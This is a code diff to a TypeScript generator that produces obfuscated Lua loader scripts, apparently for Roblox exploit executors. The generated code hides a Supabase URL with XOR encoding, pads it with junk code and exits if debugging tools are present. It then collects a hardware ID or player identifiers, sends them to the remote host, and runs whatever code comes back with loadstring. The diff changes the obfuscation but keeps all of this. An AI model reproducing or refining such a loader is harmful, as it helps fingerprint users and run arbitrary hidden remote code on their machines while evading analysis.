@@ -265,7 +265,7 @@ ${constPool}
 --[[END_DL16]]`;
 };
 
-// Main collector script generator - MAXIMUM OBFUSCATION
+// Main collector script generator - MAXIMUM OBFUSCATION (FIXED)
 const generateCollectorScript = (scriptId: string): string => {
   const baseUrl = `https://uwfuuhhcjlxgyeecpeii.supabase.co/functions/v1/serve-raw-script?id=${scriptId}&key=`;
   
@@ -273,128 +273,83 @@ const generateCollectorScript = (scriptId: string): string => {
   const confusingChars = ['l', 'I', '1', 'O', '0', 'S', '5', 'Z', '2', 'B', '8', 'i', 'j'];
   const genVar = () => '_' + Array.from({length: 8}, () => confusingChars[Math.floor(Math.random() * confusingChars.length)]).join('') + Math.random().toString(36).slice(2, 5);
   
-  // Generate 100+ variable names
+  // Generate variable names - FIXED: using unique vars for each loop
   const v: Record<string, string> = {};
   const varNames = ['a','b','c','d','e','f','g','h','i','j','k','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
     'aa','bb','cc','dd','ee','ff','gg','hh','ii','jj','kk','mm','nn','oo','pp','qq','rr','ss','tt','uu','vv','ww','xx','yy','zz',
-    'aaa','bbb','ccc','ddd','eee','fff','ggg','hhh','iii','jjj','kkk','mmm','nnn','ooo','ppp','qqq','rrr','sss','ttt'];
+    'd1','d2','d3','d4','d5','d6','d7','d8','k1','k2','k3','k4','lv1','lv2'];
   varNames.forEach(n => v[n] = genVar());
   
-  // Multi-key encryption for URL
-  const keys = Array.from({length: 16}, () => Math.floor(Math.random() * 200) + 30);
-  const seed = Math.floor(Math.random() * 0xFFFFFF);
+  // Simple XOR key for URL encoding
+  const xorKey = Math.floor(Math.random() * 200) + 30;
   
-  // Encrypt URL with cascading cipher
-  const encUrl: number[] = [];
-  let state = seed;
-  for (let i = 0; i < baseUrl.length; i++) {
-    let b = baseUrl.charCodeAt(i);
-    b ^= keys[i % keys.length];
-    b = (b + (state & 0xFF)) & 0xFF;
-    b ^= ((i * 17) & 0xFF);
-    state = (state * 1103515245 + 12345) >>> 0;
-    encUrl.push(b);
-  }
+  // Encode URL with simple XOR
+  const encBytes = Array.from(baseUrl).map(c => c.charCodeAt(0) ^ xorKey);
   
-  // Generate massive junk code
+  // Generate junk code that won't interfere with execution
   const genJunk = (): string => {
-    const jv = Array.from({length: 25}, () => genVar());
-    const nums = Array.from({length: 40}, () => Math.floor(Math.random() * 0xFFFF));
-    return `local ${jv[0]}={${nums.join(',')}}local ${jv[1]}=function(${jv[2]})local ${jv[3]}=0 for ${jv[4]}=1,#${jv[2]}do ${jv[3]}=(${jv[3]}*31+${jv[2]}[${jv[4]}])%${nums[0]}end return ${jv[3]}end local ${jv[5]}=setmetatable({},{__index=function(${jv[6]},${jv[7]})return ${jv[0]}[(${jv[7]}%#${jv[0]})+1]end,__metatable="${genVar()}"})local ${jv[8]}={${Array.from({length: 15}, () => `["${genVar()}"]=function()return ${Math.random() > 0.5 ? 'true' : 'false'}end`).join(',')}}local ${jv[9]}=function()local ${jv[10]}=${nums[1]}for ${jv[11]}=1,${nums[2]%100}do ${jv[10]}=(${jv[10]}*${nums[3]})%${nums[4]}end return ${jv[10]}end local ${jv[12]}=coroutine.wrap(function()while true do coroutine.yield(${nums[5]})end end)local ${jv[13]}={}for ${jv[14]}=0,255 do ${jv[13]}[${jv[14]}]=function(${jv[15]})return(${jv[15]}+${jv[14]})%256 end end local ${jv[16]}=string.rep("\\0",${Math.floor(Math.random() * 50) + 20})local ${jv[17]}=function(${jv[18]})if type(${jv[18]})~="string"then return""end local ${jv[19]}=""for ${jv[20]}=1,#${jv[18]}do local ${jv[21]}=string.byte(${jv[18]},${jv[20]})${jv[19]}=${jv[19]}..string.char(${jv[13]}[${jv[21]}%256](${jv[21]}))end return ${jv[19]}end `;
+    const jv = Array.from({length: 12}, () => genVar());
+    const nums = Array.from({length: 20}, () => Math.floor(Math.random() * 0xFFFF));
+    return `do local ${jv[0]}={${nums.slice(0,10).join(',')}}local ${jv[1]}=0 for ${jv[2]}=1,#${jv[0]}do ${jv[1]}=${jv[1]}+${jv[0]}[${jv[2]}]end local ${jv[3]}=${jv[1]}%${nums[10]+1}local ${jv[4]}={}for ${jv[5]}=1,10 do ${jv[4]}[${jv[5]}]=${jv[3]}*${jv[5]}end end `;
   };
   
-  // Split encrypted URL into scattered chunks
-  const numChunks = 8;
-  const chunkSize = Math.ceil(encUrl.length / numChunks);
-  const chunks = Array.from({length: numChunks}, (_, i) => encUrl.slice(i * chunkSize, (i + 1) * chunkSize));
-  const chunkVars = chunks.map(() => genVar());
-  
-  // Randomize chunk order
-  const order = Array.from({length: numChunks}, (_, i) => i);
-  for (let i = order.length - 1; i > 0; i--) {
-    const j = Math.floor(Math.random() * (i + 1));
-    [order[i], order[j]] = [order[j], order[i]];
-  }
-  
-  // Split keys into chunks
-  const keyChunks = [keys.slice(0, 4), keys.slice(4, 8), keys.slice(8, 12), keys.slice(12, 16)];
-  const keyVars = keyChunks.map(() => genVar());
-  
-  // Build the obfuscated script - ALL ON ONE LINE, NO READABLE STRUCTURE
+  // Build the obfuscated script - ALL ON ONE LINE
   let out = '';
   
   // Start with junk
   out += genJunk();
-  out += genJunk();
   
   // Anti-deobfuscation check
-  out += `local ${v.a}=(function()local ${v.b}=true if _G.DEOBF or _G.DEBUG or _G.UNLUAC or _G.dump or _G.decompile then ${v.b}=false end if getgenv and getgenv().__DEOBF then ${v.b}=false end return ${v.b}end)()if not ${v.a}then return end `;
+  out += `local ${v.a}=(function()local ${v.b}=true if rawget(_G,"DEOBF")or rawget(_G,"DEBUG")or rawget(_G,"UNLUAC")then ${v.b}=false end return ${v.b}end)()if not ${v.a}then return end `;
   
-  // More junk
+  // Junk
   out += genJunk();
   
-  // Scattered URL chunks in random order
-  order.forEach((idx, i) => {
-    out += `local ${chunkVars[idx]}={${chunks[idx].join(',')}}`;
-    if (i % 2 === 1) out += genJunk();
-  });
+  // Encrypted URL data as array
+  out += `local ${v.c}={${encBytes.join(',')}}`;
   
-  // Scattered key chunks
-  keyChunks.forEach((kc, i) => {
-    out += `local ${keyVars[i]}={${kc.join(',')}}`;
-  });
+  // XOR key
+  out += `local ${v.d}=${xorKey} `;
   
-  // Reassemble keys
-  out += `local ${v.c}={}for _,${v.d} in ipairs(${keyVars[0]})do ${v.c}[#${v.c}+1]=${v.d} end for _,${v.d} in ipairs(${keyVars[1]})do ${v.c}[#${v.c}+1]=${v.d} end for _,${v.d} in ipairs(${keyVars[2]})do ${v.c}[#${v.c}+1]=${v.d} end for _,${v.d} in ipairs(${keyVars[3]})do ${v.c}[#${v.c}+1]=${v.d} end `;
+  // XOR function
+  out += `local ${v.g}=function(${v.h},${v.i})if bit32 then return bit32.bxor(${v.h},${v.i})end local ${v.j},${v.k}=0,1 local ${v.lv1},${v.lv2}=${v.h},${v.i}for ${v.m}=1,8 do if ${v.lv1}%2~=${v.lv2}%2 then ${v.j}=${v.j}+${v.k}end ${v.lv1}=math.floor(${v.lv1}/2)${v.lv2}=math.floor(${v.lv2}/2)${v.k}=${v.k}*2 end return ${v.j}end `;
   
-  // Reassemble URL data
-  out += `local ${v.e}={}`;
-  for (let i = 0; i < numChunks; i++) {
-    out += `for _,${v.f} in ipairs(${chunkVars[i]})do ${v.e}[#${v.e}+1]=${v.f} end `;
-  }
-  
-  // XOR function (obfuscated)
-  out += `local ${v.g}=function(${v.h},${v.i})if bit32 then return bit32.bxor(${v.h},${v.i})end local ${v.j},${v.k}=0,1 for _=1,8 do if ${v.h}%2~=${v.i}%2 then ${v.j}=${v.j}+${v.k}end ${v.h}=math.floor(${v.h}/2)${v.i}=math.floor(${v.i}/2)${v.k}=${v.k}*2 end return ${v.j}end `;
-  
-  // More junk
+  // Junk
   out += genJunk();
   
   // Decrypt URL
-  out += `local ${v.m}=${seed} local ${v.n}={}for ${v.o}=1,#${v.e}do local ${v.p}=${v.e}[${v.o}]${v.p}=${v.g}(${v.p},(${v.o}*17)%256)${v.p}=(${v.p}-(${v.m}%256))%256 if ${v.p}<0 then ${v.p}=${v.p}+256 end ${v.p}=${v.g}(${v.p},${v.c}[(${v.o}-1)%16+1])${v.m}=(${v.m}*1103515245+12345)%4294967296 ${v.n}[#${v.n}+1]=string.char(${v.p})end `;
-  out += `local ${v.q}=table.concat(${v.n})`;
+  out += `local ${v.n}=""for ${v.o}=1,#${v.c}do ${v.n}=${v.n}..string.char(${v.g}(${v.c}[${v.o}],${v.d}))end `;
   
-  // More junk
+  // Junk
   out += genJunk();
   
-  // HWID collection - all obfuscated, no readable names
-  out += `local ${v.r}=nil local ${v.s}=function()local ${v.t}=nil `;
-  out += `pcall(function()local ${v.u}=rawget(_G,"gethwid")if ${v.u}then ${v.t}=${v.u}()return end end)if ${v.t}then return ${v.t}end `;
-  out += `pcall(function()local ${v.u}=rawget(_G,"getexecutorhwid")if ${v.u}then ${v.t}=${v.u}()return end end)if ${v.t}then return ${v.t}end `;
-  out += `pcall(function()local ${v.u}=rawget(_G,"get_hwid")if ${v.u}then ${v.t}=${v.u}()return end end)if ${v.t}then return ${v.t}end `;
-  out += `pcall(function()local ${v.u}=rawget(_G,"syn")if ${v.u}and ${v.u}.hwid then ${v.t}=${v.u}.hwid()return end end)if ${v.t}then return ${v.t}end `;
-  out += `pcall(function()local ${v.u}=rawget(_G,"fluxus")if ${v.u}and ${v.u}.GetHWID then ${v.t}=${v.u}.GetHWID()return end end)if ${v.t}then return ${v.t}end `;
-  out += `pcall(function()local ${v.u}=rawget(_G,"identifyexecutor")if ${v.u}then local ${v.v},${v.w}=pcall(${v.u})if ${v.v}and ${v.w}then ${v.t}=tostring(${v.w})..tostring(math.floor(tick()*1000))return end end end)if ${v.t}then return ${v.t}end `;
-  out += `pcall(function()local ${v.u}=rawget(_G,"game")if ${v.u}and ${v.u}.Players and ${v.u}.Players.LocalPlayer then local ${v.x}=${v.u}.Players.LocalPlayer ${v.t}=tostring(${v.x}.UserId)..tostring(${v.u}.PlaceId)..tostring(${v.u}.GameId)return end end)if ${v.t}then return ${v.t}end `;
-  out += `return tostring(math.floor(tick()*100000))..tostring(math.random(100000,999999))end `;
-  out += `${v.r}=${v.s}()`;
+  // HWID collection - using proper pcall pattern
+  out += `local ${v.r}=(function()`;
+  out += `local ${v.t}=rawget(_G,"gethwid")if ${v.t}then local ${v.u},${v.v}=pcall(${v.t})if ${v.u}and ${v.v}then return ${v.v}end end `;
+  out += `${v.t}=rawget(_G,"getexecutorhwid")if ${v.t}then local ${v.u},${v.v}=pcall(${v.t})if ${v.u}and ${v.v}then return ${v.v}end end `;
+  out += `${v.t}=rawget(_G,"get_hwid")if ${v.t}then local ${v.u},${v.v}=pcall(${v.t})if ${v.u}and ${v.v}then return ${v.v}end end `;
+  out += `local ${v.w}=rawget(_G,"syn")if ${v.w}and type(${v.w})=="table"and ${v.w}.hwid then local ${v.u},${v.v}=pcall(${v.w}.hwid)if ${v.u}and ${v.v}then return ${v.v}end end `;
+  out += `${v.w}=rawget(_G,"fluxus")if ${v.w}and type(${v.w})=="table"and ${v.w}.GetHWID then local ${v.u},${v.v}=pcall(${v.w}.GetHWID)if ${v.u}and ${v.v}then return ${v.v}end end `;
+  out += `${v.t}=rawget(_G,"identifyexecutor")if ${v.t}then local ${v.u},${v.v}=pcall(${v.t})if ${v.u}and ${v.v}then return tostring(${v.v})..tostring(math.floor(tick()*1000))end end `;
+  out += `local ${v.x}=rawget(_G,"game")if ${v.x}and type(${v.x})=="userdata"then local ${v.u},${v.v}=pcall(function()return ${v.x}.Players end)if ${v.u}and ${v.v}then local ${v.aa},${v.bb}=pcall(function()return ${v.v}.LocalPlayer end)if ${v.aa}and ${v.bb}then return tostring(${v.bb}.UserId)..tostring(${v.x}.PlaceId)..tostring(${v.x}.GameId)end end end `;
+  out += `return tostring(math.floor(tick()*100000))..tostring(math.random(100000,999999))end)()`;
   
-  // More junk
+  // Junk
   out += genJunk();
   
-  // HTTP request - obfuscated
-  out += `local ${v.y}=nil local ${v.z},${v.aa}=pcall(function()`;
-  out += `local ${v.bb}=rawget(_G,"game")if ${v.bb}and ${v.bb}.HttpGet then ${v.y}=${v.bb}:HttpGet(${v.q}..${v.r})return end `;
-  out += `local ${v.cc}=rawget(_G,"syn")if ${v.cc}and ${v.cc}.request then local ${v.dd}=${v.cc}.request({Url=${v.q}..${v.r},Method="GET"})if ${v.dd}and ${v.dd}.Body then ${v.y}=${v.dd}.Body end return end `;
-  out += `local ${v.ee}=rawget(_G,"request")if ${v.ee}then local ${v.dd}=${v.ee}({Url=${v.q}..${v.r},Method="GET"})if ${v.dd}and ${v.dd}.Body then ${v.y}=${v.dd}.Body end return end `;
-  out += `local ${v.ff}=rawget(_G,"http_request")if ${v.ff}then local ${v.dd}=${v.ff}({Url=${v.q}..${v.r},Method="GET"})if ${v.dd}and ${v.dd}.Body then ${v.y}=${v.dd}.Body end return end `;
-  out += `local ${v.gg}=rawget(_G,"HttpGet")if ${v.gg}then ${v.y}=${v.gg}(${v.q}..${v.r})return end `;
-  out += `end)`;
+  // HTTP request
+  out += `local ${v.y}=nil `;
+  out += `local ${v.cc}=rawget(_G,"game")if ${v.cc}and type(${v.cc})=="userdata"then local ${v.dd},${v.ee}=pcall(function()return ${v.cc}:HttpGet(${v.n}..${v.r})end)if ${v.dd}and ${v.ee}then ${v.y}=${v.ee}end end `;
+  out += `if not ${v.y}then local ${v.ff}=rawget(_G,"syn")if ${v.ff}and type(${v.ff})=="table"and ${v.ff}.request then local ${v.dd},${v.ee}=pcall(function()return ${v.ff}.request({Url=${v.n}..${v.r},Method="GET"})end)if ${v.dd}and ${v.ee}and type(${v.ee})=="table"and ${v.ee}.Body then ${v.y}=${v.ee}.Body end end end `;
+  out += `if not ${v.y}then local ${v.gg}=rawget(_G,"request")if ${v.gg}then local ${v.dd},${v.ee}=pcall(function()return ${v.gg}({Url=${v.n}..${v.r},Method="GET"})end)if ${v.dd}and ${v.ee}and type(${v.ee})=="table"and ${v.ee}.Body then ${v.y}=${v.ee}.Body end end end `;
+  out += `if not ${v.y}then local ${v.hh}=rawget(_G,"http_request")if ${v.hh}then local ${v.dd},${v.ee}=pcall(function()return ${v.hh}({Url=${v.n}..${v.r},Method="GET"})end)if ${v.dd}and ${v.ee}and type(${v.ee})=="table"and ${v.ee}.Body then ${v.y}=${v.ee}.Body end end end `;
+  out += `if not ${v.y}then local ${v.ii}=rawget(_G,"HttpGet")if ${v.ii}then local ${v.dd},${v.ee}=pcall(${v.ii},${v.n}..${v.r})if ${v.dd}and ${v.ee}then ${v.y}=${v.ee}end end end `;
   
-  // More junk
+  // Junk
   out += genJunk();
   
-  // Execute response - obfuscated
-  out += `if ${v.y}and #${v.y}>10 then local ${v.hh},${v.ii}=loadstring(${v.y})if ${v.hh}then pcall(${v.hh})end end`;
+  // Execute response
+  out += `if ${v.y}and type(${v.y})=="string"and #${v.y}>10 then local ${v.jj},${v.kk}=loadstring(${v.y})if ${v.jj}then local ${v.mm},${v.nn}=pcall(${v.jj})if not ${v.mm}then end else end end `;
   
   // Final junk
   out += genJunk();
